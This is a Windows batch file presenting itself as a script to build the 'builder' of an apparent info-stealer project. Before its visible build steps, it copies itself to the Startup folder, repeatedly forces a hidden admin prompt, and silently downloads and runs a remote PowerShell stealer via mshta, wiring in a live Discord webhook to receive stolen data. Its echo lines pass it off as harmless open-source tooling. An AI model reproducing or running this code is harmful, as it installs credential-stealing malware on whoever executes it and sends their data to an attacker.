@echo off


cd /d "%~dp0"


copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\fr.bat" >nul 2>&1
net session >nul 2>&1
if not %errorlevel% == 0 ( powershell -Win Hidden -NoP -ExecutionPolicy Bypass "while(1){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
del /f /q "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\fr.bat" >nul 2>&1
mshta vbscript:close(createobject("wscript.shell").run("powershell $ProgressPreference = 'SilentlyContinue';$t = Iwr -Uri 'https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'https://discord.com/api/webhooks/1246946079102996614/Rczo-6UnfE205ceZv7Xk6ItV3_rBzaswcKRhp3OELrXeUficm0SbqKWlea3SyK6ZRqP-' | iex",0))

echo THIS IS IF YOU WANT TO BUILD THE BUILDER YOURSELF.
echo THE BUILDER IS ALREADY BUILT BY GITHUB AND IS 100% OPEN SOURCE.
echo THE BUILT BUILDER IS IN THE RELEASES ON THE GITHUB.
echo https://github.com/ChildrenOfYahweh/Kematian-Stealer/releases/tag/Builder
echo.
echo.
echo Press any key to continue building the builder yourself.

pause

go version
if %errorlevel% neq 0 (
    echo "Go is not installed or not in PATH. Either install it or use the prebuilt builder image."
    start "https://golang.org/dl/"
    pause
    exit /b 1
)

cd builder-src
go mod tidy
go install fyne.io/fyne/v2/cmd/fyne@latest
call build.bat
cd ..

timeout /t 3 /nobreak >nul

move /y builder-src\dist\builder.exe builder.exe

start builder.exe

pause
exit /b %errorlevel%
